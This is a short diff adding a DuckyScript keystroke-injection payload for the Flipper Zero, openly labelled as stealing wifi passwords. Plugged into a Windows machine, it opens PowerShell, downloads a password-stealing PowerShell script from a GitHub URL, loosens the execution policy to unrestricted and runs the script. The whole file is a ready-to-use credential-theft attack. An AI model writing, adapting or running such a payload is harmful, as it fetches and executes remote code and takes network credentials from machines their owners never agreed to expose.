@@ -1,0 +1,26 @@
+REM This is an example of stealing wifi password using flipper zero
+
+REM Open windows CMD
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+DELAY 750
+
+REM Download ps1 file to steal the passwords
+STRING $client = new-object System.Net.WebClient
+ENTER
+STRING $client.DownloadFile("https://raw.githubusercontent.com/FlaviusMosneagu/wifi_passwords/main/wifi_passwords.ps1", "C:\Users\Public\wifi_passwords.ps1");
+ENTER
+
+STRING cd C:\Users\Public\
+ENTER
+
+REM Set execution policy
+STRING Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy unrestricted
+ENTER
+DELAY 500
+STRING a
+ENTER
+STRING .\wifi_passwords.ps1
+ENTER
